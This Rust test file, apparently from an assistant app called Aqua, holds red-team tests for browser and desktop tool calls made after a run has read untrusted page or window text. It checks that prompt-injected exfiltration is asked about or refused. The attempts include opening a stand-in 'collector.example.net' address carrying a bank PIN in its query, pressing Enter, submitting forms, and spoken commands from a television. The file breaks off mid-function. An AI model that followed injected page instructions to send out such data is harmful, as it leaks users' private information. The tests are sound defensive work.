//! Red-team cases for the one door (card R6-08, task T6-08.1), kept apart from `redteam.rs`.
//!
//! A page told the model to send what the run knows to somebody: by opening an address with it in the query, by pressing Enter, by submitting a form, by clicking, by a
//! tool the model found with `tools.search`. Each case is asked of the tool host as Aqua builds its browser and desktop providers (a preview, or a call that the scripted
//! answer refuses before anything runs), and of the old route's rules (`taint_asks`, `voice_may_use_browser_tool`), because the door is not switched on until the host is never
//! looser than the old route and these are what a switch must not loosen. No browser, no desktop and no model is started: nothing here reaches a backend.
//!
//! Round 2: every case that is about what the host decides is asked **both ways**, with the door off (the ordinary rule is applied, the door's answer only looked at) and with it
//! on (`RequestContext::door`: the door's answer is the one applied), because the switch must not loosen anything either way. The desktop is the provider's own, with a window in
//! front that the test gives it and a desktop of its own, so that nothing depends on the screen the test runs on.

use crate::agent_runs::scope::RunScope;
use crate::agent_tools::{door_call, with_host};
use crate::api_gateway::auth::{require_local_auth, ApiAuth};
use crate::door_shadow::{with_mode, DoorMode};
use crate::test_support::{app_state, wait_for, BrokerAnswerer, ScriptedApprover, TempWorld};
use crate::modules::browser_agent::{ask_before_acting_when_tainted, call_named_tool, taint_asks, tainted_question, voice_may_use_browser_tool};
use aqua_mcp_adapters::browser::{BrowserBackend, BrowserPolicyConfig, BrowserProvider, ConfirmKind, SiteMode, UrlDecision};
use aqua_mcp_adapters::windows_mcp::guard::{self, Foreground, Verdict};
use aqua_mcp_adapters::windows_mcp::provider::Desktop;
use aqua_mcp_adapters::windows_mcp::tiers;
use aqua_mcp_adapters::{new_browser_client, new_windows_client, WindowsUiProvider};
use aqua_tool_host::*;
use serde_json::{json, Value};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use tower::ServiceExt;

const LEAK: &str = "https://collector.example.net/?d=my+bank+pin+1234";

/// The tool host with the browser and the desktop providers of Aqua and nothing else: no hooks, no watch, no global ledger, and no backend that is ever started.
struct World {
    host: Arc<ToolHost>,
    /// The browser the host's provider drives: the very one the old route asks its questions of (never started).
    backend: Arc<BrowserBackend>,
    ledger: Arc<AuditLedger>,
    approver: Arc<ScriptedApprover>,
    /// The window in front, as the desktop provider reads it: a test changes it.
    front: Arc<Mutex<Option<Foreground>>>,
    dir: PathBuf,
    _cleanup: TempWorld,
}

fn plain_window() -> Foreground {
    Foreground { exe: "notepad.exe".into(), title: "Untitled - Notepad".into(), window: 1 }
}

fn world(name: &str, mode: SiteMode) -> World {
    world_with(name, mode, Some(plain_window()), false)
}

fn world_with(name: &str, mode: SiteMode, front: Option<Foreground>, full_access: bool) -> World {
    let cleanup = TempWorld::new(&format!("redteam_door_{name}"));
    let root = cleanup.root.clone();
    let backend = Arc::new(BrowserBackend::new(&root.join("browser"), new_browser_client()));
    let mut policy = BrowserPolicyConfig::default();
    policy.mode = mode;
    policy.allow = vec!["docs.example.org".into()];
    backend.set_policy(policy).unwrap();
    let ledger = Arc::new(AuditLedger::open(&root.join("host.audit.jsonl")));
    let engine = Arc::new(PolicyEngine::new(Mode::Standard));
    engine.set_full_access(full_access);
    let host = Arc::new(ToolHost::new(engine, ledger.clone()));
    host.register(Arc::new(BrowserProvider::new(backend.clone()))).unwrap();
    let front = Arc::new(Mutex::new(front));
    let reader = front.clone();
    host.register(Arc::new(WindowsUiProvider::isolated(Arc::new(Mutex::new(new_windows_client())), Arc::new(move || reader.lock().unwrap().clone()), full_access, tiers::Policy::Strict)))
        .unwrap();
    let approver = Arc::new(ScriptedApprover::denying());
    host.set_approver(approver.clone());
    World { host, backend, ledger, approver, front, dir: root, _cleanup: cleanup }
}

fn request(caller: Caller, run: &str, tool: &str, args: Value, door: bool) -> ToolRequest {
    let mut context = RequestContext::new(caller);
    context.agent_run_id = run.into();
    context.door = door;
    ToolRequest { tool: tool.into(), arguments: args, context }
}

fn preview(w: &World, caller: Caller, run: &str, tool: &str, args: Value, door: bool) -> Preview {
    w.host.preview(&request(caller, run, tool, args, door)).unwrap_or_else(|e| panic!("{tool}: {e:?}"))
}

fn policy(mode: SiteMode) -> BrowserPolicyConfig {
    let mut p = BrowserPolicyConfig::default();
    p.mode = mode;
    p.allow = vec!["docs.example.org".into()];
    p
}

/// Does the old route ask about a call of a run that read outside text?
fn old_route_asks(source: &str, tool: &str, args: &Value, mode: SiteMode, full_access: bool, named: bool) -> bool {
    taint_asks(true, source, tool, args, || Some(policy(mode)), full_access, || named)
}

#[test]
fn after_a_page_was_read_opening_an_address_nobody_listed_with_the_notes_in_its_query_asks_every_time_in_the_denylist_mode_through_the_host_and_the_old_route() {
    let nav = json!({"url": LEAK});
    for door in [false, true] {
        let w = world(&format!("navigate_denylist_{door}"), SiteMode::Denylist);
        // A clean run: the person chose to open everything but what is denied, so it opens.
        let p = preview(&w, Caller::Agent, "clean", "browser.navigate", nav.clone(), door);
        assert_eq!((p.decision, p.door), (Decision::Auto, Decision::Auto), "door={door}: {p:?}");
        // After a page was read: asked every time, by the host's rule for a request to a target nobody allowed, and the door says the same.
        w.host.mark_tainted("read");
        let p = preview(&w, Caller::Agent, "read", "browser.navigate", nav.clone(), door);
        assert_eq!((p.decision, p.door), (Decision::AlwaysAsk, Decision::AlwaysAsk), "door={door}: {p:?}");
        let p = preview(&w, Caller::Agent, "read", "browser.tabs", json!({"action": "new", "url": LEAK}), door);
        assert_eq!(p.decision, Decision::AlwaysAsk, "door={door}, a new tab on the same address: {p:?}");
        // And a call, not only a preview: the answer is no, and the browser is never reached (the question comes first).
        let res = w.host.call_blocking(request(Caller::Agent, "read", "browser.navigate", nav.clone(), door));
        assert_eq!(res.error.as_ref().map(|e| e.code), Some(ErrorCode::ApprovalDenied), "door={door}: {}", res.text);
        let asked = w.approver.asked.lock().unwrap().clone();
        assert!(asked.len() == 1 && asked[0].always_ask && asked[0].tool == "browser.navigate", "door={door}: {asked:?}");
        // A listed site is not asked about.
        let p = preview(&w, Caller::Agent, "read", "browser.navigate", json!({"url": "https://docs.example.org/page?q=x"}), door);
        assert_eq!(p.decision, Decision::Auto, "door={door}: {p:?}");
    }
    // The old route asks too, in every mode, unless the person (or a search of the run) named the address.
    let args = json!({"url": LEAK});
    assert!(old_route_asks("browser", "browser_navigate", &args, SiteMode::Denylist, false, false));
    assert!(old_route_asks("browser", "browser_navigate", &args, SiteMode::Ask, true, false), "site prompt on, full access on: it opens silently, so it asks");
    assert!(old_route_asks("browser", "local_open_url", &args, SiteMode::Denylist, true, false), "the person's own browser on the same address");
    assert!(old_route_asks("browser", "browser_tabs", &json!({"action": "new", "url": LEAK}), SiteMode::Denylist, false, false));
    assert!(!old_route_asks("browser", "browser_navigate", &args, SiteMode::Denylist, false, true), "an address the person named");
    assert!(!old_route_asks("browser", "browser_navigate", &json!({"url": "https://docs.example.org/"}), SiteMode::Denylist, true, false), "a listed site");
}

#[test]
fn after_a_page_was_read_in_the_modes_that_ask_or_refuse_the_site_policy_decides_and_the_host_adds_nothing_a_clean_run_does_not_have() {
    for door in [false, true] {
        // Ask mode, no full access: the browser's own site prompt asks about an address nobody listed, for any run; the host leaves the decision to it.
        let w = world(&format!("navigate_ask_{door}"), SiteMode::Ask);
        assert!(matches!(policy(SiteMode::Ask).check_url_with(LEAK, false), UrlDecision::Ask { .. }));
        w.host.mark_tainted("read");
        let p = preview(&w, Caller::Agent, "read", "browser.navigate", json!({"url": LEAK}), door);
        assert_eq!(p.decision, Decision::Auto, "door={door}: the site prompt asks, once, and the old route does not ask twice: {p:?}");
        // Allowlist mode: nothing nobody listed opens, before anyone is asked.
        let w = world(&format!("navigate_allowlist_{door}"), SiteMode::Allowlist);
        let refused = w.host.preview(&request(Caller::Agent, "read", "browser.navigate", json!({"url": LEAK}), door)).unwrap_err();
        assert_eq!(refused.code, ErrorCode::NetworkBlocked, "door={door}: {refused:?}");
        assert!(w.approver.asked.lock().unwrap().is_empty());
    }
    assert!(!old_route_asks("browser", "browser_navigate", &json!({"url": LEAK}), SiteMode::Ask, false, false));
}

#[test]
fn after_a_page_was_read_the_hosts_click_submit_and_every_spelling_of_enter_ask_every_time_and_a_clean_runs_enter_and_submit_stay_free() {
    for door in [false, true] {
        let w = world(&format!("submit_{door}"), SiteMode::Ask);
        let calls: Vec<(&str, &str, Value)> = vec![
            ("browser.click", "browser_click", json!({"target": "e1"})),
            ("browser.type", "browser_type", json!({"target": "e2", "text": "hello", "submit": true})),
            ("browser.press_key", "browser_press_key", json!({"key": "Enter"})),
            ("browser.press_key", "browser_press_key", json!({"key": "Return"})),
            ("browser.press_key", "browser_press_key", json!({"key": "NumpadEnter"})),
            ("browser.press_key", "browser_press_key", json!({"key": "Control+Enter"})),
            ("browser.press_key", "browser_press_key", json!({"key": "Shift+Enter"})),
        ];
        for (i, (host_name, old_name, args)) in calls.iter().enumerate() {
            // A clean run: free, as it was decided on 2026-10-08 (Enter and submit ask only after taint or the private mark).
            let clean = preview(&w, Caller::Agent, &format!("clean_{i}"), host_name, args.clone(), door);
            assert_eq!((clean.decision, clean.door), (Decision::Auto, Decision::Auto), "door={door} {host_name} {args}: {clean:?}");
            // After a page was read: asked every time by the host, by the door, and by the old route.
            let run = format!("read_{i}");
            w.host.mark_tainted(&run);
            let read = preview(&w, Caller::Agent, &run, host_name, args.clone(), door);
            assert_eq!((read.decision, read.door), (Decision::AlwaysAsk, Decision::AlwaysAsk), "door={door} {host_name} {args}: {read:?}");
            assert!(old_route_asks("browser", old_name, args, SiteMode::Ask, false, false), "{old_name} {args}");
            // And through a call: the answer is no, the question is one to ask every time, and nothing was sent.
            let res = w.host.call_blocking(request(Caller::Agent, &run, host_name, args.clone(), door));
            assert_eq!(res.error.as_ref().map(|e| e.code), Some(ErrorCode::ApprovalDenied), "door={door} {host_name} {args}: {}", res.text);
        }
        let asked = w.approver.asked.lock().unwrap().clone();
        assert_eq!(asked.len(), calls.len(), "door={door}: {asked:?}");
        assert!(asked.iter().all(|a| a.always_ask), "an answer to one of these is never remembered");
        // A key that sends nothing, and typing that does not submit, are not held for Enter.
        let p = preview(&w, Caller::Agent, "clean_tab", "browser.press_key", json!({"key": "Tab"}), door);
        assert_eq!((p.decision, p.door), (Decision::Auto, Decision::Auto), "door={door}");
    }
}

#[test]
fn a_run_that_holds_private_data_and_has_read_nothing_untrusted_is_asked_before_it_submits_or_presses_enter_through_the_door_though_the_applied_rule_does_not() {
    for door in [false, true] {
        let w = world(&format!("private_{door}"), SiteMode::Ask);
        w.host.mark_private("holds");
        // With the door off, what is applied is unchanged and the door only says what it would ask; with it on, that is what is applied.
        let applied = if door { Decision::Ask } else { Decision::Auto };
        for (tool, args) in [
            ("browser.type", json!({"target": "e1", "text": "x", "submit": true})),
            ("browser.press_key", json!({"key": "Enter"})),
        ] {
            let p = preview(&w, Caller::Agent, "holds", tool, args.clone(), door);
            assert_eq!((p.decision, p.door), (applied, Decision::Ask), "door={door} {tool}: {p:?}");
            assert!(p.door_reason.contains("private data"), "{}", p.door_reason);
        }
        // Typing that sends nothing, and a look, are not held.
        for (tool, args) in [("browser.type", json!({"target": "e1", "text": "x"})), ("browser.snapshot", json!({})), ("browser.click", json!({"target": "e1"}))] {
            let p = preview(&w, Caller::Agent, "holds", tool, args.clone(), door);
            assert_eq!((p.decision, p.door), (Decision::Auto, Decision::Auto), "door={door} {tool}: {p:?}");
        }
        // And through a call with the door on: the person is asked, and a no stops the send.
        if door {
            let res = w.host.call_blocking(request(Caller::Agent, "holds", "browser.press_key", json!({"key": "Enter"}), true));
            assert_eq!(res.error.as_ref().map(|e| e.code), Some(ErrorCode::ApprovalDenied), "{}", res.text);
            assert_eq!(w.approver.asked.lock().unwrap().len(), 1);
        }
    }
}

#[test]
fn a_desktop_or_browser_tool_the_model_found_with_the_tool_search_is_asked_about_after_a_window_was_read_though_it_skips_the_old_routes_own_question() {
    for door in [false, true] {
        let w = world(&format!("found_{door}"), SiteMode::Ask);
        let manifests = w.host.manifests();
        let names = |query: &str| -> Vec<String> { crate::tool_search::search(&manifests, query, 8).into_iter().map(|h| h.name).collect() };
        let on_screen = names("Click at screen coordinates or at an element label from the last snapshot");
        assert!(on_screen.iter().any(|n| n == "win.click"), "the search should find the desktop's click for a click on the screen: {on_screen:?}");
        let on_page = names("Click an element by its reference from the last snapshot");
        assert!(on_page.iter().any(|n| n == "browser.click"), "and the browser's click for a click on a page: {on_page:?}");
        // Whatever the search finds that changes something is asked about every time once a window or page was read. (The desktop here is the provider's own, with a plain window
        // in front, so the answer is asked every time and not a refusal that depends on the screen.)
        let args_for = |name: &str| -> Option<Value> {
            Some(match name {
                "win.click" => json!({"loc": [10, 10]}),
                "win.type" => json!({"text": "hi"}),
                "win.shortcut" => json!({"shortcut": "ctrl+s"}),
                "win.app" => json!({"mode": "launch", "name": "Notepad"}),
                "win.multi_edit" => json!({"locs": [[1, 1]]}),
                "win.multi_select" => json!({"locs": [[1, 1]]}),
                "win.move" => json!({"loc": [1, 1], "drag": true, "from_loc": [2, 2]}),
                "browser.click" => json!({"target": "e1"}),
                "browser.type" => json!({"target": "e1", "text": "x"}),
                "browser.press_key" => json!({"key": "Enter"}),
                _ => return None,
            })
        };
        let mut checked = 0;
        for name in manifests.iter().map(|m| m.name.as_str()).filter(|n| args_for(n).is_some()) {
            let run = format!("read_{name}");
            w.host.mark_tainted(&run);
            let p = preview(&w, Caller::Agent, &run, name, args_for(name).unwrap(), door);
            assert!(p.decision >= Decision::AlwaysAsk && p.door >= Decision::AlwaysAsk, "door={door} {name}: {p:?}");
            checked += 1;
        }
        assert_eq!(checked, 10, "door={door}: every tool of the list was checked");
    }
}

#[test]
fn typing_with_enter_in_a_chat_window_is_a_send_the_guard_asks_about_the_provider_says_it_sends_and_a_run_that_read_outside_text_asks_even_with_full_access() {
    let chat = Foreground { exe: "slack.exe".into(), title: "Slack - team".into(), window: 1 };
    let enter = json!({"text": "I will pay you", "press_enter": true});
    let at = |front: &Foreground, full: bool| WindowsUiProvider::classify_with("win.type", &enter, guard::Caller::Agent, &Desktop { front: Some(front), full_access: full, tiers: tiers::Policy::Strict, step: None, busy: None });
    // The guard asks (without full access) and the provider says the call sends.
    assert!(matches!(guard::evaluate_tiered("Type", &enter, guard::Caller::Agent, Some(&chat), false, tiers::Policy::Strict), Verdict::Ask(_)));
    let c = at(&chat, false).unwrap();
    assert!(!c.target_allowed && c.classes.contains(&PermClass::ExternalEffect), "{c:?}");
    assert!(WindowsUiProvider::call_sends_something_out("win.type", &enter));
    // With full access the guard lets it through; a run that read outside text is asked every time, on the old route and in the host.
    assert_eq!(guard::evaluate_tiered("Type", &enter, guard::Caller::Agent, Some(&chat), true, tiers::Policy::Strict), Verdict::Allow);
    assert!(taint_asks(true, "windows", "Type", &enter, || None, true, || false));
    assert!(at(&chat, true).unwrap().target_allowed);
    // A line break in the text is Enter too.
    assert!(WindowsUiProvider::call_sends_something_out("win.type", &json!({"text": "hello\n"})));
    // Through the host, both ways. Without full access even a clean run is asked, and the answer is never remembered; with full access a clean run goes on, and a run that read
    // outside text is asked every time.
    for door in [false, true] {
        let w = world_with(&format!("chat_{door}"), SiteMode::Ask, Some(chat.clone()), false);
        let p = preview(&w, Caller::Agent, "clean", "win.type", enter.clone(), door);
        assert_eq!((p.decision, p.door), (Decision::AlwaysAsk, Decision::AlwaysAsk), "door={door}: {p:?}");
        let res = w.host.call_blocking(request(Caller::Agent, "clean", "win.type", enter.clone(), door));
        assert_eq!(res.error.as_ref().map(|e| e.code), Some(ErrorCode::ApprovalDenied), "door={door}: {}", res.text);
        let asked = w.approver.asked.lock().unwrap().clone();
        assert!(asked.len() == 1 && asked[0].always_ask && asked[0].classes.contains(&PermClass::ExternalEffect), "door={door}: {asked:?}");
        let w = world_with(&format!("chat_full_{door}"), SiteMode::Ask, Some(chat.clone()), true);
        let p = preview(&w, Caller::Agent, "clean", "win.type", enter.clone(), door);
        assert_eq!(p.decision, Decision::Auto, "door={door}, full access, a clean run: {p:?}");
        w.host.mark_tainted("read");
        let p = preview(&w, Caller::Agent, "read", "win.type", enter.clone(), door);
        assert_eq!((p.decision, p.door), (Decision::AlwaysAsk, Decision::AlwaysAsk), "door={door}, full access, after a window was read: {p:?}");
    }
}

#[test]
fn a_spoken_request_through_the_host_keeps_what_decisions_d_13_and_d_14_gave_it_a_look_and_text_into_the_window_in_front_and_nothing_that_changes_or_opens_anything_else() {
    for door in [false, true] {
        let w = world(&format!("voice_{door}"), SiteMode::Ask);
        // A look is allowed, by the host and by the old route.
        for (tool, old_name, args) in [("browser.snapshot", "browser_snapshot", json!({})), ("browser.tabs", "browser_tabs", json!({"action": "list"})), ("browser.find", "browser_find", json!({"text": "x"}))] {
            let p = preview(&w, Caller::Voice, "said", tool, args.clone(), door);
            assert_eq!((p.decision, p.door), (Decision::Auto, Decision::Auto), "door={door} {tool}: {p:?}");
            assert!(voice_may_use_browser_tool(old_name, &args), "{old_name}");
        }
        // A click, typing, a key, a script, an upload: refused to the voice by both.
        for (tool, old_name, args) in [
            ("browser.click", "browser_click", json!({"target": "e1"})),
            ("browser.type", "browser_type", json!({"target": "e1", "text": "x"})),
            ("browser.press_key", "browser_press_key", json!({"key": "Enter"})),
            ("browser.evaluate", "browser_evaluate", json!({"function": "() => 1"})),
            ("browser.upload", "browser_file_upload", json!({"paths": ["a.txt"]})),
        ] {
            let p = preview(&w, Caller::Voice, "said", tool, args.clone(), door);
            assert_eq!(p.decision, Decision::Deny, "door={door} {tool}: {p:?}");
            assert!(!voice_may_use_browser_tool(old_name, &args), "{old_name}");
        }
        // Opening a page: the old route lets a spoken request go to another page (the site prompt still asks); the host refuses it to the voice, which is stricter, and is listed in
        // the table as a place where switching the door would ask less of the voice than of anyone. A page on this computer is refused by both.
        let nav = json!({"url": "https://docs.example.org/page"});
        assert!(voice_may_use_browser_tool("browser_navigate", &nav));
        assert_eq!(preview(&w, Caller::Voice, "said", "browser.navigate", nav, door).decision, Decision::Deny, "door={door}");
        assert!(!voice_may_use_browser_tool("browser_navigate", &json!({"url": "http://localhost:5678/"})));
        // The desktop: looking, text into the window in front (decision D-14) and opening an app by name are the voice's, by the named list; the rest is refused.
        let p = preview(&w, Caller::Voice, "said", "win.snapshot", json!({}), door);
        assert_eq!(p.decision, Decision::Auto, "door={door}: {p:?}");
        for (tool, args) in [("win.type", json!({"text": "hi"})), ("win.app", json!({"mode": "launch", "name": "Notepad"})), ("win.scroll", json!({"direction": "down"}))] {
            let p = preview(&w, Caller::Voice, "said", tool, args, door);
            assert_eq!((p.decision, p.door), (Decision::Auto, Decision::Auto), "door={door} {tool}: {p:?}");
        }
        for (tool, args) in [
            ("win.click", json!({"loc": [1, 1]})),
            ("win.shortcut", json!({"shortcut": "ctrl+s"})),
            ("win.type", json!({"text": "hi", "press_enter": true})),
            ("win.type", json!({"text": "hi\n"})),
            ("win.type", json!({"text": "hi", "loc": [1, 1]})),
            ("win.app", json!({"mode": "launch", "name": "PowerShell"})),
            ("win.multi_edit", json!({"locs": [[1, 1]]})),
        ] {
            match w.host.preview(&request(Caller::Voice, "said", tool, args.clone(), door)) {
                Ok(p) => assert_eq!(p.decision, Decision::Deny, "door={door} {tool} {args}: {p:?}"),
                Err(e) => assert_eq!(e.code, ErrorCode::PermissionDenied, "door={door} {tool} {args}: {e:?}"),
            }
        }
        // Where the agent would be asked, the voice is refused: a browser in front, a window nobody could name, and a sign-in step.
        for front in [Some(Foreground { exe: "chrome.exe".into(), title: "Facebook".into(), window: 2 }), None, Some(Foreground { exe: "bank.exe".into(), title: "Sign in to your account".into(), window: 3 })] {
            *w.front.lock().unwrap() = front.clone();
            let e = w.host.preview(&request(Caller::Voice, "said", "win.type", json!({"text": "hi"}), door)).unwrap_err();
            assert_eq!(e.code, ErrorCode::PermissionDenied, "door={door} {front:?}: {e:?}");
        }
        assert!(w.approver.asked.lock().unwrap().is_empty(), "a spoken request is never asked about any of them");
    }
}

/// Found by another card's red team (R4-03): `clipboard.read` is a read by its classes and always asks, so a spoken request reached the question, and a television that says the
/// wake word could put it to the person. The voice's list in the host is named now, and the clipboard is not on it.
#[test]
fn a_spoken_request_cannot_read_or_write_the_clipboard_and_is_not_even_asked_while_the_agent_is_asked_every_time() {
    use aqua_native_tools::clipboard::{ClipboardProvider, ClipboardSource};
    struct Held {
        reads: Mutex<usize>,
        writes: Mutex<usize>,
    }
    impl ClipboardSource for Held {
        fn read_text(&self) -> Result<Option<String>, String> {
            *self.reads.lock().unwrap() += 1;
            Ok(Some("my bank pin is 1234".into()))
        }
        fn write_text(&self, _text: &str) -> Result<(), String> {
            *self.writes.lock().unwrap() += 1;
            Ok(())
        }
    }
    let _cleanup = TempWorld::new("redteam_door_clipboard");
    let root = _cleanup.root.clone();
    let held = Arc::new(Held { reads: Mutex::new(0), writes: Mutex::new(0) });
    let host = ToolHost::new(Arc::new(PolicyEngine::new(Mode::Standard)), Arc::new(AuditLedger::open(&root.join("host.audit.jsonl"))));
    host.register(Arc::new(ClipboardProvider::new(held.clone()))).unwrap();
    let approver = Arc::new(ScriptedApprover::approving_once());
    host.set_approver(approver.clone());
    for door in [false, true] {
        for (tool, args) in [("clipboard.read", json!({})), ("clipboard.write", json!({"text": "from a television"}))] {
            let res = host.call_blocking(request(Caller::Voice, "said", tool, args.clone(), door));
            assert!(!res.ok, "door={door} {tool}: {}", res.text);
            assert_eq!(res.error.as_ref().map(|e| e.code), Some(ErrorCode::PermissionDenied), "door={door} {tool}: {}", res.text);
            assert!(!res.text.contains("1234"));
        }
    }
    assert!(approver.asked.lock().unwrap().is_empty(), "the policy refused it before anyone was asked");
    assert_eq!((*held.reads.lock().unwrap(), *held.writes.lock().unwrap()), (0, 0), "the clipboard was never opened for a spoken request");
    // The agent is asked every time, and when the person says yes it reads.
    let res = host.call_blocking(request(Caller::Agent, "run_a", "clipboard.read", json!({}), false));
    assert!(res.ok, "{}", res.text);
    let asked = approver.asked.lock().unwrap().clone();
    assert!(asked.len() == 1 && asked[0].always_ask && asked[0].tool == "clipboard.read", "{asked:?}");
    assert_eq!(*held.reads.lock().unwrap(), 1);
}

/// Card R6-08, T6-08.8: the question "this run has read outside text; may it do this?" that the old route puts carries what the host's questions carry.
#[test]
fn the_question_a_run_that_read_outside_text_is_asked_says_what_the_call_can_do_what_could_go_wrong_which_rule_asked_and_what_the_run_has_read_and_holds() {
    let p = policy(SiteMode::Ask);
    // A click in the browser, from a run that read a page and holds nothing private.
    let (classes, why) = tainted_question("browser", "browser_click", &json!({"target": "e1"}), Some(&p), false);
    assert!(classes.contains(&"WRITE".to_string()) && classes.contains(&"NETWORK".to_string()), "{classes:?}");
    assert!(why.risk.starts_with("This changes a file or a setting"), "{}", why.risk);
    assert!(why.rule.contains("read content from the web or your screen") && why.rule.contains("every time"), "{}", why.rule);
    assert_eq!(why.data, vec!["Target: browser_click".to_string(), "This run has read text from outside (a web page, a file or a window). Such text can try to steer Aqua.".to_string()]);
    // An address: named by its origin and path, never by the query that holds the notes; and a run that holds private data says so.
    let (classes, why) = tainted_question("browser", "browser_navigate", &json!({"url": LEAK}), Some(&p), true);
    assert_eq!(classes, vec!["NETWORK".to_string()]);
    assert_eq!(why.risk, "This sends a request over the internet.");
    assert_eq!(why.data.len(), 3, "{:?}", why.data);
    assert_eq!(why.data[0], "Target: https://collector.example.net/");
    assert!(why.data[2].contains("private data of yours"), "{:?}", why.data);
    assert!(!format!("{why:?}").contains("1234") && !format!("{why:?}").contains("bank"), "what the address carried is not in the question: {why:?}");
    // The desktop, and the person's own browser opened on an address.
    let (classes, why) = tainted_question("windows", "Click", &json!({"loc": [1, 1]}), None, false);
    assert_eq!((classes, why.data[0].as_str()), (vec!["WRITE".to_string()], "Target: Click"));
    let (classes, _) = tainted_question("browser", "local_open_url", &json!({"url": LEAK}), Some(&p), false);
    assert_eq!(classes, vec!["NETWORK".to_string()]);
    // And the question is put with it (card OA3-01, AQ-04: this searched the old route's source for the call). The old route's own question is put to a browser whose broker is answered
    // by a thread, and what the person would be shown is what `tainted_question` builds, for a run that holds nothing private and for one that does.
    let w = world("question_built", SiteMode::Ask);
    let click = json!({"target": "e1"});
    let put = |tainted_run: &str| -> aqua_mcp_adapters::browser::ConfirmRequest {
        let backend = w.backend.clone();
        let answerer = std::thread::spawn(move || {
            let open = wait_for(std::time::Duration::from_secs(10), "the old route's question to be put", || backend.broker().pending().into_iter().next());
            backend.broker().resolve_typed(&open.request_id, aqua_mcp_adapters::browser::Decision::Deny);
            open
        });
        let refused = ask_before_acting_when_tainted(&Some(w.backend.clone()), true, "browser", "browser_click", &click);
        assert!(refused.as_deref().is_some_and(|r| r.starts_with("ERROR [CONFIRMATION_DENIED] browser_click:")), "{tainted_run}: {refused:?}");
        answerer.join().unwrap()
    };
    let shown = put("a run that holds nothing private");
    let (classes, why) = tainted_question("browser", "browser_click", &click, Some(&w.backend.policy()), false);
    assert_eq!((shown.kind, shown.always_ask, shown.classes.clone(), shown.risk.clone(), shown.rule.clone(), shown.data.clone()), (ConfirmKind::Action, true, classes, why.risk, why.rule, why.data), "{shown:?}");
    // A run that holds the person's data says so in the question: the mark is read from the host of the thread.
    let scope = RunScope::begin(Some(w.host.clone()));
    w.host.mark_private(scope.id());
    let shown = with_host(w.host.clone(), || put("a run that holds private data"));
    let (_, private) = tainted_question("browser", "browser_click", &click, Some(&w.backend.policy()), true);
    assert_eq!(shown.data, private.data);
    assert!(shown.data.iter().any(|line| line.contains("private data of yours")), "{:?}", shown.data);
}

// ---------------------------------------------------------------------------------------------
// Task T6-08.10: a test per route that the person's hooks, a loaded skill's list, the refusal limit and the signed ledger now apply.

/// A hook of the person's that refuses the tools it names.
struct Refuses(&'static [&'static str]);

impl Hooks for Refuses {
    fn pre_tool(&self, call: &HookCall) -> HookAnswer {
        if self.0.contains(&call.tool.as_str()) {
            HookAnswer::Deny("the person's hook says no".into())
        } else {
            HookAnswer::Pass
        }
    }

    fn post_tool(&self, _call: &HookCall, _ok: bool, _text: &str) -> PostAnswer {
        PostAnswer::default()
    }
}

/// The host as Aqua builds it for the routes, with the person's hook and a signed ledger (the key is in memory, in a folder of the test's own).
struct Routes {
    w: World,
    keys: Vec<Vec<u8>>,
}

fn routes(name: &str, refused: &'static [&'static str]) -> Routes {
    let w = world(name, SiteMode::Ask);
    w.host.set_hooks(Arc::new(Refuses(refused)));
    let data = w.dir.join("data");
    let signer = crate::audit_key::load_or_create(&aqua_native_tools::secrets::MemorySecrets::new(), &data).unwrap();
    w.ledger.set_head_signer(Arc::new(signer));
    let keys = crate::audit_key::known_public_keys(&data);
    Routes { w, keys }
}

impl Routes {
    /// A call as the route makes it with the door on: the text the route answers with.
    fn through(&self, wire: &str, args: Value, caller: Caller, run: &str) -> String {
        door_call(DoorMode::On, Some(&self.w.host), wire, args, caller, run).unwrap_or_else(|| panic!("the door did not take {wire}"))
    }

    /// The newest ledger line of this run (or of the calls with no run).
    fn newest(&self, run: &str) -> Value {
        self.w.ledger.recent(20, Some(run)).into_iter().next().unwrap_or_else(|| panic!("no ledger line for run {run:?}"))
    }

    /// The ledger, sealed with the signed head: the chain and the heads check with the key, and nothing is left unsigned.
    fn assert_the_ledger_is_signed(&self) {
        assert!(self.w.ledger.seal().unwrap().is_some(), "a head was written over the lines");
        let check = self.w.ledger.check(&self.keys);
        assert!(check.problems.is_empty() && check.broken_at_line.is_none(), "{check:?}");
        assert!(check.lines > 0 && check.heads >= 1 && check.unsealed_lines == 0 && check.covered_lines == check.lines, "{check:?}");
    }
}

/// What a route that makes the call itself, with the door on, shows of the hook and the ledger.
fn assert_the_hook_and_the_ledger_apply(r: &Routes, wire: &str, host_name: &str, args: Value, caller: Caller, run: &str) {
    let text = r.through(wire, args, caller, run);
    assert!(text.starts_with(&format!("ERROR [PERMISSION_DENIED] {host_name}:")) && text.contains("a hook refused this call"), "{text}");
    assert_the_ledger_says_the_hook_refused(r, host_name, caller, run);
}

/// The newest line of the ledger for the run is the person's hook refusing the call, as the caller that made it; nobody was asked; the ledger is signed.
fn assert_the_ledger_says_the_hook_refused(r: &Routes, host_name: &str, caller: Caller, run: &str) {
    let line = r.newest(run);
    assert_eq!((line["tool"].as_str(), line["decision"].as_str(), line["caller"].as_str(), line["agent_run_id"].as_str()), (Some(host_name), Some("denied_by_hook"), Some(caller.as_str()), Some(run)), "{line}");
    assert!(r.w.approver.asked.lock().unwrap().is_empty(), "a refusal by the person's hook is not put to the person");
    r.assert_the_ledger_is_signed();
}

const API: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const UI: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

/// The route table that is served, behind the check of the token, over a gateway state whose tool host is the world's (card OA3-01, AQ-04: the three routes below used to be checked by
/// searching the server's source for the call to the door).
fn gateway(w: &World) -> axum::Router {
    let state = app_state(&w._cleanup, w.host.clone());
    let auth = ApiAuth::new(API.to_string(), 8767).with_ui_token(UI.to_string());
    crate::api_gateway::server::api_routes().layer(axum::middleware::from_fn_with_state(auth, require_local_auth)).with_state(state)
}

/// A POST of the app (or a script) to the route, with the one door switched on for this thread, read where the route reads it: the answer's status and body.
fn post_with_the_door_on(app: &axum::Router, path: &str, token: &str, body: Value) -> (axum::http::StatusCode, Value) {
    with_mode(DoorMode::On, || {
        tokio::runtime::Builder::new_current_thread().enable_all().build().unwrap().block_on(async {
            assert_eq!(DoorMode::from_env(), DoorMode::On, "the route reads the mode on the thread of the request");
            let request = axum::http::Request::builder()
                .method("POST")
                .uri(path)
                .header("host", "127.0.0.1:8767")
                .header("authorization", format!("Bearer {token}"))
                .header("content-type", "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap();
